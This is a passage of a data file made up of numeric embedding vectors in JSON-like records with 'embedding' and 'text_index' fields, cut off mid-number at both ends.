7,-0.010979779055059011,-0.027225370514074896,0.0015839451672540487,0.008128397657597257,0.01431852819629124,-0.024289960195273404,-0.027427039925290265,0.022508547062870973,0.033992499645968406,0.01192090297406407,0.034507877030185465,-0.02713573966464584,0.02325920542683929,-0.016133552897229567,0.035673078072763154,0.012436280358281124,0.04831102784225965,0.00579239364435256,0.040804444202576444,0.00038023086906231144,0.017825335180202944,-0.028883541228512378,-0.042910769164159195,-0.02167946170565223,0.03134838958781134,-0.033544345398823144,-0.008638173113724997,0.01142233137411496,0.003680466754680495,0.013926393230039134,-0.0025544792087280146,0.032334328931530924,0.008542940336206629,0.027449447637647527,-0.017914966029632,-0.020682318505754013,0.027830378747721003,0.0019928859177741035,0.002452244021098001,-0.028502610118438902,-0.00889025987774421,-0.004758837911873791,0.019371467332854112,-0.022586974056121395,-0.018564789687992633,0.029466141749801222,0.0028681871817297006,0.005576719412913901,0.0014971152818696535,-0.01573021407479883,0.01025713033153727,-0.004333091377085789,0.025880907772639097,-0.023572913399840977,0.0015503335987181537,0.011685621994312804,0.02397625222227172,0.019237021058710533,0.027471855350004792,-0.036367717155838315,-0.026687585417500576,0.08192259637815458],""text_index"":0},{""embedding"":[-0.042236045508837534,0.009051396989116752,0.06322843373091525,-0.0011735407452766514,0.03209391235257801,0.008246193850021823,-0.011095813469939335,0.01855964682311006,-0.004514277173436462,0.01183248868230278,0.030586297964485375,-0.0037718913005120596,-0.01262055983971484,-0.00776649836290144,-0.01739467206867484,0.019050763631352354,0.011392767819109096,0.008217640547217037,-0.03106599345160576,0.006675762195758664,-0.00763515316999943,0.046644675461896296,0.036000004176272554,-0.0048626274676548354,-0.034697973568374375,-0.0012477793325690915,-0.0026440358397230635,-0.002833915303374882,0.01926776873266872,0.02727411483913035,-0.010033630605601345,0.011118656112183163,0.022545687894658002,0.000780218999140742,0.027137058985667383,-0.02919289678761188,0.00039153716471061024,0.013568529492833692,-0.011347082534621442,-0.024441627200895707,-0.008645940089288809,0.014185280833417042,-0.01885660117227982,0.03501777055978796,0.035063455844275615,-0.0022071703068098575,0.01606979881853283,0.03213959763706566,0.0020786804441883266,0.01597842824955752,0.01073604185459905,0.14180712304968277,0.03394416637432806,-0.015293148982242688,-0.014048224979954074,-0.01956472308183848,0.005199556440751295,0.015098986523170151,-0.012529189270739528,-0.012734773050933979,-0.028210663171127286,-0.007349620141951583,0.003326459776757418,-0.02530964760616116,-0.01906218495247427,-0.008800127924434646,0.0627715808860387,0.016046956176289005,-0.03140863308526318,-0.002422747742985982,-0.0028610409410394274,-0.006481599736686128,0.013351524391517327,0.000810199967085766,0.04109391339664615,0.03764467441782816,0.007081219095586607,-0.007795051665706224,-0.02176903805836786,-0.020432743487103933,-0.03001523190838968,-0.008314721776753306,0.020763961799639435,0.008857234530044215,0.0024327413989676566,0.009274112750994072,0.004637056375497036,-0.024784266834553124,0.03730203478417074,-0.022260154866610156,-0.023173860556363265,0.031180206662824898,0.02524111967942968,0.01582995107497264,0.025994926873475994,-0.03919797409040844,0.022351525435585468,-0.014573605751562113,-0.026177668011426618,0.008274747152826608,-0.003326459776757418,0.0014583599407543787,-0.031225891947312553,0.009496828512871392,-0.0022899748849437335,0.01913071287920575,-0.0008444639304515077,-0.013500001566102208,-0.0027425447343995706,0.038855334456751024,0.002975254152258566,-0.010970178937598283,-0.02482995211904078,0.023002540739534557,0.014505077824830629,-0.006424493131076558,0.008788706603312732,0.009262691429872159,0.02154061163592958,0.030906094955898963,-0.03147716101199466,0.006612944929588137,0.0291243688608804,0.0008637374098447373,0.004157360888376653,-0.0002787516186317107,0.02482995211904078,-0.009251270108750244,-0.012118021710350629,-0.011032996203768809,0.016823606012579147,0.012392133417276562,0.02380203321806853,-0.02594924158898834,-0.028005079390932837,0.009354061998847469,0.02492132268801609,0.0062131986903211514,0.04943147781564328,0.01771446906008843,0.018970814383498957,-0.043789345181417826,-0.012243656242691681,-0.0019930205357739724,-0.044611680302195623,-0.0017460344665125847,0.015784265790484985,0.00603045755237053,0.00015302785721939301,0.028073607317664322,0.052766503583242134,-0.022305840151097812,-0.019781728183154844,-0.017017768471651682,0.006778554085855888,0.03625127324095466,-0.010741752515160005,0.000868020405265455,0.016812184691457233,-0.02727411483913035,-0.04107107075440232,0.08789848735424924,-0.002411326421864068,-0.012586295876349098,-0.02645177971835255,0.022579951858023743,-0.020752540478517524,0.0011528396007431825,-0.011055838846012637,0.013842641199759625,0.010164975798503355,-0.028347719024590254,0.021197972002272164,0.02029568763364097,0.001523318704635264,-0.010713199212355222,-0.02236294675670738,0.01547589012019331,-0.0006991990024321654,0.06930457656777343,-0.018639596070963455,0.02215736297651293,-0.004362944668571103,-0.039769040146504134,-0.022694165069242885,0.0640964541361807,-0.02359644943787408,-0.028027922033176667,-0.010427666184307374,-0.012597717197471011,-0.0018488263566098096,0.0026554571608449775,-0.06103554007550779,0.021255078607881735,0.02315101791411944,-0.015338834266730344,0.04623350790150739,0.01950761647622891,0.007983503464217803,0.003212246565538279,-0.03631980116768614,-0.003277919161989284,0.009748097577553499,-0.021426398424710443,0.006818528709782588,-0.0028267769776736855,-0.0015404506863181348,0.004151650227815696,-0.026063454800207476,-0.010878808368622973,-0.011204316020597517,0.014573605751562113,0.011901016609034264,0.016846448654822977,-0.009245559448189286,0.057974626014834864,0.005476523477957706,0.03689086722378184,-0.02348223622665494,0.012883250225518858,0.027639597115031594,0.0010464785477953594,0.026634520856303173,-0.013180204574688619,-0.038969547667970166,-0.022522845252414176,-0.013203047216932447,-0.003866117199767849,-0.005442259514591965,-0.031819800645652076,0.002468433027473638,-0.0019159266182010536,0.023527921511142597,0.0017674494436161732,0.011615483580986418,-0.011992387178009576,0.016263961277605366,0.0028253493125334466,0.012129443031472542,0.018696702676573026,0.03357868409842681,-0.01235786945391082,-0.0009051396989116751,-0.03054061267999772,0.01809137265711159,-0.031134521378337242,-0.021609139562661063,-0.0378502581980226,-0.017371829426431014,0.0030637693909533986,-0.005268084367482778,0.010079315890089001,-0.004011739044072251,-0.01651523034228747,-0.00378902328219493,-0.027228429554642695,0.010244925046356752,0.0012913231193463883,-0.02212309901314719,0.015464468799071396,0.023082489987387954,-0.034560917714911404,0.06606092136914989,-0.006481599736686128,-0.0006356679036915194,-0.024670053623333986,0.010027919945040388,0.008309011116192349,-0.07962945086198359,-0.010444798165990244,0.00199730353119469,0.04207614701313074,0.011147209414987948,0.009656727008578187,0.022568530536901832,-0.031111678736093412,0.029170054145368055,-0.00003473241598988264,-0.0028638962713199057,-0.008914341135653784,-0.0419619338019116,0.013557108171711777,-0.013351524391517327,-0.021049494827687285,-0.021963200517440395,0.0390837608791893,0.028210663171127286,-0.02212309901314719,0.005633566643384022,0.017326144141943358,0.004568528448765553,0.00030212963530312813,-0.0070869297561475635,0.001090022334572656,0.019496195155106998,0.023230967161972836,-0.009114214255287278,0.01879949456667025,0.00640165048883273,0.005279505688604692,0.005550762065250146,0.017280458857455702,-0.005142449835141725,0.008149112620485555,0.022739850353730537,-0.03305330332681877,-0.01220939227932594,-0.01582995107497264,0.06619797722261286,-0.023013962060656472,0.011341371874060485,-0.022991119418412642,-0.007001269847733209,-0.0005464388324265672,-0.034675130926130546,-0.005939086983395218,-0.04536548749624194,-0.00481694218316718,0.019781728183154844,0.021460662388076184,-0.003774746630792538,0.013294417785907758,0.012392133417276562,0.015909900322826038,0.015315991624486516,0.011067260167134552,-0.04486294936687773,-0.009508249833993307,0.003429251666854643,-0.022020307123049965,-0.02725127219688652,0.006989848526611295,-0.021152286717784508,0.022408632041195035,0.0246015256966025,-0.015852793717216467,-0.018970814383498957,-0.011855331324546609,0.009548224457920005,0.03618274531422318,0.011158630736109862,0.024167515493969772,0.002713991431594786,-0.02960406434800078,0.006607234269027181,0.003197969914135887,0.0205697993405669,0.034149750154522505,-0.016755078085847665,0.015544418046924793,-0.003246510528904021,0.042304573435569016,0.013579950813955605,0.0270685310589359,0.03284771954662433,-0.02027284499139714,-0.04810660456550127,0.0392436593748961,0.0007174017329702157,-0.026931475205472934,-0.004148794897535218,0.031842643287895905,-0.026611678214059343,-0.00481694218316718,-0.031728430076676764,0.027228429554642695,0.009456853888944693,0.0010236359055515317,-0.0657411243777363,-0.012883250225518858,-0.009702412293065843,-0.026520307645084035,0.03481218677959351,0.00946256454950565,-0.02992386133941437,0.021129444075540682,-0.012837564941031204,-0.008177665923290339,0.023413708299923456,-0.0007438135380646415,0.03531472490895772,0.03298477540008729,0.01597842824955752,-0.014036803658832161,-0.02380203321806853,-0.02919289678761188,0.048928939686279066,-0.019164976842571492,-0.002154346696621006,0.01515609312877972,-0.03042639946877858,0.015932742965069864,-0.010204950422430054,0.020250002349153313,0.031774115361164416,0.006276015956491678,0.005927665662273304,0.006441625112759429,-0.009702412293065843,-0.01795431680364862,0.015498732762437137,-0.0010400540546642828,-0.029695434916976092,0.0054822341385186634,-0.01570431654263159,0.0040888329616451695,-0.0352918822667139,0.026177668011426618,-0.08753300507834799,-0.019290611374912545,0.0011114373116762446,-0.0006884915138803711,0.024989850614747573,-0.004976840678873974,0.02036421556037245,-0.019473352512863168,-0.020147210459056087,-0.05075635106578529,-0.022328682793341638,0.03828426840065533,0.015110407844292066,-0.00033889201266428843,0.009588199081846703,-0.009485407191749479,-0.06167513405833496,0.0015761423148241158,0.007538071940463162,-0.008674493392093594,-0.031157364020581068,0.013225889859176275,0.002335660169431389,0.00011117942279613044,0.011210026681158475,0.01060469666169704,-0.010142133156259527,0.015384519551218,-0.0050168153028006725,0.04436041123751352,0.019644672329691876,-0.021026652185443456,0.010953046955915412,-0.014607869714927854,0.007155457682879047,-0.027799495610738387,-0.02489848004577226,0.060395946092680605,-0.012883250225518858,0.01764594113335695,0.0007338198820829669,0.0024555840412114846,-0.2982335371354153,0.020192895743543743,0.0020972400910114364,0.009068528970799622,-0.026703048783034655,0.01215228567371637,0.003552030868915217,-0.02195177919631848,0.0025640865918696663,0.020752540478517524,0.004314404053802969,0.04883756911730376,0.010022209284479432,0.0202385810280314,0.010102158532332829,-0.03003807455063351,0.013077412684591394,0.04059137526728194,0.03332741503374471,-0.02292259149168116,0.0007106203235540793,0.001396256507153972,0.008177665923290339,-0.019119291558083836,-0.00826903649226565,-0.030403556826534752,-0.026931475205472934,-0.0578375701613719,-0.0030837567029167482,-0.01821700718945264,0.01627538259872728,-0.014059646301075989,-0.02366497736460556,-0.009965102678869861,-0.04152792359927887,-0.00531948031253139,-0.01573858050599733,0.023265231125338577,0.023265231125338577,0.031796958003408246,0.023779190575824703,0.007201142967366702,-0.006150381424150625,-0.031842643287895905,0.005465102156835792,0.027730967684006905,0.0039060918236945475,0.006858503333709286,-0.020044418568958864,0.028416246951321736,0.011341371874060485,0.009371193980530339,-0.006510153039490913,0.015327412945608429,-0.013796955915271969,-0.0025883568992537335,0.025195434394942023,0.005719226551798376,0.06761422104173018,0.045616756560924045,0.0004350809514879069,-0.006019036231248616,0.03104315080936193,0.010404823542063546,0.012986042115616084,-0.0392436593748961,0.00517100313794651,-0.008023478088144503,0.04392640103488079,-0.046119294690288255,0.03787310084026643,0.02718274427015504,-0.014048224979954074,0.04810660456550127,-0.0057706224968469885,-0.03958629900855351,0.012426397380642303,0.014516499145952544,-0.01748604263765015,0.004274429429876271,-0.012997463436737997,-0.022225890903244415,0.008463198951338187,0.00798921412477876,0.018696702676573026,-0.005819163111615123,-0.005567894046933018,-0.02200888580192805,-0.004260152778473878,0.01521319973438929,0.03207106971033418,-0.020398479523738192,0.004822652843728136,-0.004728426944472347,-0.021894672590708913,-0.019484773833985083,-0.0011278554607889958,-0.0033664344006841167,-0.0295355364212693,0.011335661213499527,-0.021106601433296852,-0.003946066447621246,-0.033121831253550255,0.018753809282182593,-0.0037233506857439255,0.007338198820829669,0.004014594374352729,0.0018987946365181829,0.007657995812243258,0.025560916670843266,-0.015510154083559052,0.0202385810280314,0.010107869192893785,-0.034035536943303364,-0.0032379445380625854,-0.014219544796782783,-0.008668782731532636,-0.0772538160686255,0.021346449176857046,0.00233280483915091,-0.03574873511159045,-0.0023342325042911495,0.0011271416282188761,-0.04109391339664615,0.010319163633649191,-0.00008815832240977278,0.025583759313087095,0.04783249285857533,-0.012163706994838284,0.01971320025642336,-0.03526903962447007,0.02070685519402987,0.03339594296047619,-0.04543401542297342,0.0017331854802504316,-0.02074111915739561,0.045479700707461074,-0.014847717458488046,0.018399748327403265,0.04760406643613706,0.010981600258720197,-0.019027920989108528,-0.0037005080435000975,0.0024013327658823935,0.01650380902116556,-0.023916246429287667,-0.0038889598420116765,-0.008668782731532636,0.062223357472186824,-0.008548858859752541,-0.018022844730380107,-0.0038746831906092843,-0.020467007450469674,-0.0013655617066388286,0.01882233720891408,-0.03360152674067064,0.0072182749490495735,0.010216371743551967,-0.0040888329616451695,0.019701778935301447,0.012540610591861442,0.0023813454539190443,0.008668782731532636,0.013876905163125366,0.03287056218886815,0.018434012290769006,0.013991118374344505,0.013762691951906228,-0.008074874033193114,-0.028073607317664322,0.01989594139437398,0.03191117121462739,0.025263962321673505,0.0003615561967655863,-0.04579949769887467,0.013397209676004983,0.01580710843272881,0.011295686589572829,-0.014607869714927854,-0.020181474422421828,-0.008154823281046511,0.0291243688608804,-0.01338578835488307,0.0032807744922697625,0.034195435439010165,-0.012734773050933979,-0.035977161534028725,0.00420019084258383,-0.019918784036617808,0.013911169126491109,-0.030586297964485375,-0.007035533811098951,0.0012627698165416036,-0.001663229888378709,0.006727158140807276,-0.014996194633072927,0.0001914855869345874,-0.0065329956817347405,0.011923859251278092,-0.013111676647957137,-0.006498731718368999,0.01256345323410527,-0.013340103070395414,-0.02150634767256384,0.017931474161404795,-0.0009265546760152636,-0.028758886584979153,0.008149112620485555,0.0061903560480773235,0.0025883568992537335,-0.01838832700628135,-0.008012056767022588,-0.01485913877960996,-0.01491624538521953,-0.029261424714343363,0.03250507991296691,0.02050127141383542,0.0070298231505379945,-0.0024070434264433505,0.041345182461328255,-0.012540610591861442,0.031020308167118104,-0.006841371352026415,0.020489850092713504,0.0133286817492735,-0.004991117330276366,-0.016492387700043645,-0.0026054888809366045,0.023048226024022213,0.02727411483913035,0.028553302804784703,-0.026428937076108723,-0.012197970958204025,0.024373099274164225,-0.017634519812235034,0.022534266573536087,0.011227158662841345,-0.004191624851742394,-0.02489848004577226,-0.045616756560924045,0.022579951858023743,-0.03360152674067064,0.03287056218886815,0.002075825113907848,0.07455838428385382,-0.019930205357739723,0.00784073695019388,-0.015875636359460297,0.013751270630784313,0.005053934596446892,-0.01882233720891408,0.03134010515853169,-0.017543149243259722,0.01650380902116556,0.006424493131076558,0.018993657025742784,-0.005742069194042204,-0.010290610330844408,-0.002682582798509523,0.002998096794502394,-0.008834391887800387,-0.0017374684756711492,-0.04696447245330988,-0.0330761459690626,-0.011541244993693977,-0.04639340639721419,-0.017782996986819913,-0.005396574230104309,-0.019473352512863168,-0.006087564157980099,-0.0027939406794481834,-0.008440356309094359,-0.005810597120773687,-0.046073609405800596,-0.0061560920847115825,-0.06331980429989056,-0.019439088549497427,0.019279190053790633,0.0190050783468647,-0.010370559578697805,0.004148794897535218,0.009833757485967851,0.03821574047392385,-0.02562944459757475,-0.02990101869717054,0.011935280572400007,-0.031819800645652076,0.002138642380078374,-0.030791881744679825,0.018742387961060678,0.0038689725300483273,0.02032995159700671,0.004631345714936079,-0.048563457410377826,-0.02348223622665494,-0.003375000391525552,-0.006315990580418376,-0.017588834527747378,0.06633503307607583,0.004445749246704978,0.03501777055978796,0.0004846923151112204,-0.0006021177728958975,0.02891878508068595,-0.004871193458496271,-0.00869733603433742,-0.0011428459447615077,0.03209391235257801,-0.03291624747335581,-0.000705623495563242,-0.02736548540810566,0.014356600650245748,0.0400659944956739,0.022374368077829294,0.0007530933614761966,0.03207106971033418,0.02441878455865188,-0.06683757120544004,0.04065990319401342,-0.01836548436403752,-0.002541243949625839,-0.006487310397247085,-0.007869290252998665,-0.006053300194614357,0.017200509609602305,0.02027284499139714,0.004988261999995888,0.04251015721576347,0.027593911830543938,0.011072970827695509,0.0053166249822509115,0.018970814383498957,-0.00132558708271213,-0.005447970175152922,-0.030906094955898963,0.08364975589689727,-0.011101524130500293,0.010798859120769576,0.021255078607881735,-0.02339086565767963,0.005350888945616653,-0.007246828251854358,0.00015186787929294865,0.008143401959924598,0.034058379585547194,-0.00015088635950903417,0.04034010620259983,0.0070640871139037355,-0.006224620011443065,-0.02480710947679695,-0.026862947278741448,-0.005013959972520194,0.02380203321806853,0.0007288230540921296,0.0035092009147080403,0.03134010515853169,0.001577569979964355,-0.015041879917560582,-0.02492132268801609,0.022854063564949678,-0.009439721907261823,-0.026086297442451306,-0.013819798557515797,-0.02725127219688652,-0.04328680705205361,0.003828997906121629,0.004180203530620481,-0.003089467363477705,0.023173860556363265,0.013465737602736467,0.011695432828839815,-0.003623414125927179,-0.017371829426431014,-0.006418782470515602,0.01741751471091867,-0.0022500002610170346,-0.0030837567029167482,0.01388832648424728,-0.01476776821063465,0.011495559709206321,0.01768020509672269,-0.04639340639721419,0.023916246429287667,-0.012015229820253404,-0.0027154190967350255,-0.020958124258711974,-0.026291881222645756,-0.003283629822550241,0.007383884105317325,-0.0017831537601588048,0.034058379585547194,-0.004659899017740864,0.024213200778457428,-0.020055839890080775,0.02859898808927236,-0.0120951790681068,0.05505076780762491,0.022203048261000585,0.003320749116196461,0.01865101739208537,0.04308122327185916,0.013145940611322878,0.009565356439602875,0.03474365885286203,-0.0034349623274156,-0.009342640677725556,-0.007041244471659908,-0.027548226546056282,-0.025903556304500683,0.010810280441891489,-0.020147210459056087,-0.010918782992549671,-0.015178935771023548,0.026063454800207476,0.049385792531155624,-0.014699240283903165,0.019416245907253597,-0.03083756702916748,0.009302666053798857,-0.021814723342855512,0.0785786893187675,-0.006555838323978568,-0.02001015460559312,-0.009776650880358282,0.06025889023921764,0.042213202866593705,-0.02150634767256384,-0.0010993021579842111,-0.0034692262907813414,-0.0018259837143659817,-0.00037190676903232076,-0.033532998813939154,-0.019850256109886326,0.02551523138635561,0.011472717066962495,0.012689087766446323,-0.04970558952256921,-0.004791244210642873,0.05834010829073611,-0.019884520073252067,0.023756347933580873,0.04723858416023582,-0.02245431732568269,-0.03346447088720767,0.003520622235829954,0.002070114453346891,0.01206091510474106,-0.009730965595870627,0.011101524130500293,-0.006652919553514836,-0.009525381815676177,-0.0005210977761873209,-0.012015229820253404,-0.015578682010290534,-0.02150634767256384,0.031682744792189105,0.023870561144800014,0.01359137213507752,0.02668020614079083,0.013934011768734936,0.0000027884084770297563,0.02051269273495733,0.02006726121120269,-0.014379443292489576,-0.00927982341155503,0.02604061215796365,-0.007172589664561918,0.011135788093866035,0.002011580182597082,-0.003235089207782107,0.01500761595419484,-0.025172591752698197,0.023253809804216662,-0.015898479001704123,-0.0001541878351458374,-0.00849175225414297,0.01570431654263159,-0.011752539434449384,-0.013145940611322878,-0.041185283965621454,-0.00785786893187675,0.013043148721225653,0.010187818440747183,0.0023042515363461257,-0.00694416324212364,0.007875000913559622,0.03531472490895772,0.000940831327417656,0.025675129882062407,-0.0010143560821399766,0.0000020076541034614245,-0.006949873902684597,0.0026468911700035422,-0.036479699663392935,-0.011289975929011872,0.009833757485967851,0.0015561550028607663,-0.005073921908410242,0.002536960954205121,-0.014128174227807471,0.02071827651515178,0.0040888329616451695,-0.017668783775600775,-0.0258350283777692,-0.019941626678861638,-0.032642135766429874,0.03912944616367696,-0.04075127376298873,-0.024350256631920395,-0.01562436729477819,-0.007509518637658377,-0.03581726303832193,-0.007366752123634454,0.010998732240403068,0.011729696792205556,0.009125635576409191,0.03191117121462739,0.017748733023454172,-0.04390355839263696,0.00681281804922163,-0.013991118374344505,-0.04529695956951046,-0.006704315498563449,0.04390355839263696,0.043789345181417826,0.015395940872339912,0.003586294832280959,-0.011415610461352924,-0.021700510131636375,-0.024784266834553124,0.030380714184290926,0.0334873135294515,0.029147211503124226,-0.0003610208223379966,0.0036890867223781836,0.028644673373760015,0.014265230081270439,0.03010660247736499,-0.011404189140231011,0.026565992929571687,-0.021928936554074654,-0.0010457647152252397,-0.011112945451622207,0.0005956932797648209,-0.0035548861991956957,0.018411169648525176,-0.0006777840253285769,-0.020855332368614747,0.03202538442584652,-0.0019944482009142117,0.0008630235772746176,-0.012003808499131489,-0.03382995316310892,-0.008965737080702398,0.042304573435569016,0.000980092118774235,0.009251270108750244,0.024236043420701257,0.004225888815108136,-0.0014476524522025844,-0.022762692995974367,-0.0026240485277597143,-0.0037661806399511026,0.002718274427015504,0.021643403526026804,0.002828204642813925,0.023870561144800014,-0.020204317064665658,0.00025323210424993436,-0.01786294623467331,0.0038090105941582797,0.014699240283903165,0.007480965334853593,-0.07195432306805745,0.027845180895226043,0.00909137161304345,-0.008029188748705458,0.0068699246548312,0.026497465002840205,0.021609139562661063,0.07136041436971793,0.025149749110454367,-0.0459137109100938,0.0021814723342855513,0.0407284311207449,0.034697973568374375,0.04100254282767084,-0.025583759313087095,0.008822970566678474,-0.026314723864889582,-0.004571383779046031,-0.028142135244395804,-0.047421325298186434,0.25729952223447594,0.018399748327403265,-0.018753809282182593,-0.011301397250133786,0.010970178937598283,0.04906599553974204,-0.011901016609034264,-0.003831853236402107,0.0262461959381581,-0.024670053623333986,-0.0011828205686882063,0.02697716048996059,-0.015818529753850726,0.0545482296782607,0.0021229380635357426,0.04086548697420787,-0.03478934413734968,-0.013168783253566706,0.037941628766997915,-0.012437818701764218,0.01362563609844326,0.03063198324897303,0.004314404053802969,0.020992388222077715,0.023276652446460492,0.023379444336557715,-0.021848987306221257,0.017200509609602305,-0.019484773833985083,0.014276651402392352,-0.01739467206867484,0.014493656503708716,-0.025994926873475994,0.03821574047392385,0.003946066447621246,-0.02727411483913035,0.01624111863536154,0.008834391887800387,-0.02154061163592958,-0.038489852180849785,0.057974626014834864,0.005807741790493209,-0.06738579461929191,0.010598986001136082,0.0004468591888948806,0.019473352512863168,0.001814562393244068,-0.01903934231023044,-0.019164976842571492,0.0315913742232138,-0.025286804963917334,-0.00640165048883273,0.041345182461328255,-0.005670685937030242,0.016115484103020487,0.02245431732568269,0.026497465002840205,0.026817261994253796,0.007520939958780291,-0.03565736454261514,0.00631027991985742,0.015236042376633119,-0.01814847926272116,-0.013488580244980295,-0.01577284446936307,0.015464468799071396,0.013442894960492639,0.040796959047476385,0.0028381982987955995,0.01603553485516709,0.014642133678293597,0.0034692262907813414,-0.0026854381287900013,-0.0024484457155102882,-0.0349720852753003,-0.00388324918145072,-0.02297969809729073,-0.019085027594718095,-0.007315356178585841,-0.003769035970231581,0.004571383779046031,0.007880711574120578,0.03424112072349782,-0.030700511175704513,-0.007338198820829669,-0.02412183020948212,0.011489849048645365,0.004300127402400576,-0.009274112750994072,-0.03641117173666145,0.006527285021173783,0.013934011768734936,0.020444164808225848,0.014413707255855319,0.002367068802516652,-0.009611041724090531,-0.006059010855175314,-0.030791881744679825,0.017874367555795224,-0.04433756859526969,-0.02869035865824767,0.04860914269486548,0.0043429573566077535,0.015658631258143933,-0.01977030686203293,0.012711930408690151,-0.011661168865474074,0.02560660195533092,0.014173859512295127,-0.02219162693987867,0.016115484103020487,-0.002299968540925408,0.01491624538521953,0.011569798296498762,0.04554822863419256,-0.0025398162844855994,0.021883251269586998,-0.0015575826680010057,0.018319799079549868,0.026428937076108723,-0.022876906207193504,-0.004228744145388615,0.01883375853003599,-0.03689086722378184,0.014881981421853787,0.022260154866610156,-0.01338578835488307,-0.020467007450469674,-0.016526651663409386,0.019576144402960394,-0.032619293124186044,-0.0516700567555384,-0.03193401385687121,-0.005308058991409476,-0.025401018175136472,0.0024670053623333985,-0.005342322954775218,-0.03565736454261514,0.010730331194038092,-0.013876905163125366,0.0023485091556935418,-0.0008173382927869621,-0.013203047216932447,0.005099619880934548,-0.00315513995992871,-0.00789784355580345,-0.009565356439602875,-0.009394036622774167,-0.0038204319152801932,-0.02919289678761188,0.03081472438692365,-0.01665228619575044,0.044565995017707964,0.017737311702332257,0.03449238978817992,0.009873732109894551,-0.0380101566937294,-0.02718274427015504,-0.02171193145275829,0.009274112750994072,0.0065444170028566544,0.006635787571831965,-0.010895940350305843,-0.006835660691465458,0.033761425236377436,-0.03442386186144844,-0.015133250486535894,-0.0011399906144810292,-0.03880964917226337,0.006470178415564214,-0.034172592796766335,0.023322337730948148,-0.026223353295914274,0.013808377236393882,-0.020204317064665658,-0.028439089593565565,-0.019918784036617808,-0.006595812947905267,-0.010176397119625268,0.014550763109318285,0.01689213393931063,0.010439087505429288,0.01650380902116556,-0.049477163100130936,-0.044063456888343754,0.0067100261591244055,0.019758885540911014,0.013671321382930916,0.009439721907261823,-0.02439594191640805,-0.004522843164277897,-0.013922590447613022,0.023961931713775322,-0.022374368077829294,0.00012295766020310414,0.021494926351441925,0.014310915365758094,-0.0060247468918095725,0.031180206662824898,0.022899748849437334,-0.008497462914703928,-0.02962690699024461,0.020649748588420298,0.004003173053230815,0.0028182109868322503,-0.0036919420526586623,-0.06464467755003257,0.03209391235257801,0.025675129882062407,-0.014002539695466418,-0.004948287376069189,-0.0004043861509727634,0.021928936554074654,0.010130711835137612,0.004225888815108136,-0.012220813600447853,0.0033093277950745474,-0.030997465524874274,0.0017745877693173694,0.00882868122723943,-0.016252539956483455,-0.008920051796214742,0.016366753167702593,-0.014208123475660868,0.04157360888376653,0.028964470365173602,0.0027296957481374178,-0.006761422104173018,0.018285535116184123,-0.038055841978217056,0.017931474161404795,0.00048826147796181843,-0.01521319973438929,0.02736548540810566,-0.03657107023236825,0.0013805521906113405,0.029489851136781643,-0.006093274818541056,0.013842641199759625,-0.006196066708638281,-0.0035777288414395236,0.024967007972503744,-0.019941626678861638,-0.0452512742850228,0.014676397641659338,-0.01704061111389551,0.011689722168278857,-0.05770051430790893,0.0005268084367482778,-0.04534264485399811,-0.0028981602346856475,-0.00826903649226565,0.003800444603316844,0.03104315080936193,-0.005159581816824596,-0.02062690594617647,-0.010804569781330532,-0.02321954584085092,0.006555838323978568,0.015030458596438668,-0.0270685310589359,0.00903426500743388,-0.027502541261568626,-0.02359644943787408,0.021586296920417237,-0.014002539695466418,-0.018548225501988144,0.0005603585675438998,-0.049203051393205,-0.0005046796270745696,-0.004414340613619715,-0.07072082038689076,0.04280711156493323,0.039906095999967105,-0.014265230081270439,-0.002628331523180432,0.013774113273028141,-0.04168782209498567,0.023276652446460492,0.01118147337835369,0.0400659944956739,-0.011598351599303548,0.00018738104965639963,-0.004046003007437992,0.06126396649794606,-0.011855331324546609,0.012677666445324408,-0.006841371352026415,-0.005839150423578472,-0.019644672329691876,0.014482235182586801,-0.008423224327411489,-0.0063902291677108165,0.017463199995406326,0.004888325440179141,-0.01704061111389551,-0.03054061267999772,-0.007737945060096655,-0.007469544013731679,0.008526016217508713,0.002045844145962824,-0.00959390974240766,-0.018171321904964986,-0.01220939227932594,0.0032607871803064133,0.006715736819685362,-0.012677666445324408,-0.019107870236961925,-0.04404061424609993,-0.015041879917560582,0.03446954714593609,0.0034520943090984705,0.04330964969429744,0.007469544013731679,0.013785534594150056,0.009496828512871392,-0.002701142445332633,0.02597208423123217,0.0034206856760132073,0.010850255065818187,0.011295686589572829,-0.004919734073264404,-0.00378902328219493,-0.03574873511159045,-0.028827414511710638,0.026657363498547,-0.004057424328559906,0.002465577697193159,0.0009386898297072972,-0.050893406919248256,0.004188769521461916,-0.00789784355580345,-0.0006635073739261845,0.01000507730279656,-0.011135788093866035,0.010347716936453977,0.0014490801173428238,-0.0026982871150521546,0.019404824586131686,-0.02560660195533092,-0.02503553589923523,0.0500253865139828,0.008508884235825841,-0.00666434087463675,0.0005371590090150122,0.016926397902676374,-0.032185282921553315,0.009565356439602875,-0.023173860556363265,0.02348223622665494,-0.019953047999983552,-0.006675762195758664,-0.0270685310589359,0.01814847926272116,0.037416247995389874,0.018045687372623933,-0.007657995812243258,-0.02079822576300518,-0.025355332890648816,0.021369291819100873,-0.012197970958204025,0.013614214777321347,-0.012323605490545078,0.028256348455614942,0.004285850750998184,0.02816497788663963,0.007241117591293401,-0.017554570564381637,-0.03394416637432806,-0.028027922033176667,0.018114215299355415,-0.019553301760716565,0.04143655303030356,0.0050168153028006725,-0.005119607192897897,0.0037718913005120596,-0.035063455844275615,-0.0005086057062102275,-0.01050761543216077,-0.030654825891216857,-0.0084746202724601,0.014893402742975702,0.010039341266162303,0.04068274583625724,-0.007041244471659908,-0.006881345975953114,0.03255076519745456,0.01015355447738144,0.0014455109544922256,0.016846448654822977,0.00632741190154029,-0.04239594400454433,0.010067894568967086,0.02798223674868901,0.013145940611322878,-0.01935913930164403,0.007361041463073497,0.011484138388084408,0.049203051393205,0.026817261994253796,0.0018416880309086135,-0.00923984878762833,-0.004425761934741629,0.03081472438692365,0.028576145447028533,0.0037290613463048824,0.012323605490545078,0.008731599997703163,-0.010673224588428523,0.01697208318716403,0.009548224457920005,-0.008000635445900675,0.0020130078477373216,-0.005587881358896367,-0.020546956698323075,-0.01866243871320728,-0.021369291819100873,0.007326777499707755,-0.00632741190154029,0.05194416846246434,0.020467007450469674,0.023573606795630253,0.005490800129360099,0.049979701229495146,0.007618021188316559,0.010678935248989479,0.012289341527179337,-0.012118021710350629,0.045114218431559834,-0.0026240485277597143,-0.01146129574584058,-0.04097970018542701,0.0019330585998839245,0.020901017653102403,0.04582234034111849,0.014881981421853787,-0.019850256109886326,-0.03410406487003485,0.022854063564949678,0.031819800645652076,0.006087564157980099,0.022545687894658002,-0.03124873458955638,0.012689087766446323,-0.012666245124202495,0.042761426280445575,0.003392132373208423,0.06035026080819295,0.0014704950944464123,0.027845180895226043,-0.024076144924994464,0.04527411692726663,-0.013420052318248811,-0.02942132321005016,-0.02530964760616116,0.024373